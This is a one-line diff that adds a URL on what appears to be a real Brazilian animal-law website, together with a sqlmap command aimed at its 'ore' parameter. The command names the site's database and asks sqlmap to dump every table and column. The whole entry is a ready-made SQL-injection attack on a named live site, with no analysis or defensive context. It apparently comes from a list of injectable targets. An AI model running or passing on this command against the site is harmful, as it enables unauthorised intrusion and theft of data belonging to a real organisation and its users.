@@ -1,0 +1,1 @@
+https://www.direitoanimal.net.br/visualizador.php?ore=2254 (GET)  # sqlmap.py -u https://www.direitoanimal.net.br/visualizador.php?ore=2254 -D direiorg_animal --tables --columns --dump-all --stop=10 --threads 5 -v3
